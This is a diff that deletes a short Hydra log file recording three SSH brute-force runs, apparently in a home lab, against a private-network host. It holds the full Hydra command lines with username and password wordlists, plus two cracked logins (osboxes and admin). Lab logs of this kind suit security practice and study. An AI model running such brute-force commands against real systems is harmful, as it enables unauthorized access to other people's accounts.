@@ -1,5 +1,0 @@
-# Hydra v9.1 run at 2021-11-11 22:49:44 on 192.168.8.133 ssh (hydra -L ../lists/usernames/top-usernames-shortlist.txt -P ../lists/passwords/2020-200_most_used_passwords.txt -s 22 -o ../logs/111121/192.168.8.133/attacks/brute_force_SSH.txt -vV 192.168.8.133 ssh)
-# Hydra v9.1 run at 2021-11-11 22:50:45 on 192.168.8.133 ssh (hydra -l osboxes -p osboxes.org -s 22 -o ../logs/111121/192.168.8.133/attacks/brute_force_SSH.txt -vV 192.168.8.133 ssh)
-[22][ssh] host: 192.168.8.133   login: osboxes   password: osboxes.org
-# Hydra v9.1 run at 2021-11-11 22:51:20 on 192.168.8.133 ssh (hydra -L ../lists/usernames/top-usernames-shortlist.txt -P ../lists/passwords/2020-200_most_used_passwords.txt -s 22 -o ../logs/111121/192.168.8.133/attacks/brute_force_SSH.txt -vV 192.168.8.133 ssh)
-[22][ssh] host: 192.168.8.133   login: admin   password: 123456
